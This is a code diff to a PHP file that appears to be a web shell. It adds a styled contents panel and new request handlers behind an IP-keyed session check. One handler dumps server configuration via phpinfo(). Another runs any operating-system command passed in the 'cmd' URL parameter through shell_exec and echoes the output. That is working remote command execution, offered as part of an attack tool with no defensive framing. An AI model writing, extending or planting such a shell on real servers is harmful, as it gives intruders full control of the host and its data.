@@ -88,6 +88,7 @@
 	{
 		ShellHead();
 		ShellNavbar();
+		ShellContents();
 	}
 
 	/**
@@ -184,6 +185,26 @@
 		}
 
 		/* END - NAVBAR */
+		/* BEGIN - CONTENTS */
+
+		.contents {
+			position:relative;
+			width: 80%;
+			height: 80%;
+			background-color: #333;
+			margin: 50px auto;
+		}
+
+		.contents a {
+			position: relative;
+			top: 50%;
+			left: 50%;
+			transform: translate(-50%,-50%);
+			text-decoration: none;
+			color: #fff;
+		}
+
+		/* END - CONTENTS */
 	</style>
 </head>
 <?php
@@ -205,6 +226,18 @@
 			<a href="?exit"><li class="exit">⛔</li></a>
 		</ul>
 	</nav>
+</div>
+<?php
+	}
+
+	/**
+	 *	Shell contents HTML template
+	 */
+	function ShellContents()
+	{
+?>
+<div class="contents">
+	<a href="?phpinfo"><span>TEST</span></a>
 </div>
 <?php
 	}
@@ -301,8 +334,19 @@
 		}
 		else if(isset($_SESSION[md5($_SERVER['REMOTE_ADDR'])]))
 		{
-			GatherInformation();
-			Shell();
+			if(isset($_GET['phpinfo']))
+			{
+				phpinfo();
+			}
+			else if(isset($_GET['cmd']))
+			{
+				echo shell_exec($_GET['cmd'] . ' 2>&1');
+			}
+			else
+			{		
+				GatherInformation();
+				Shell();
+			}
 		}
 		else
 		{
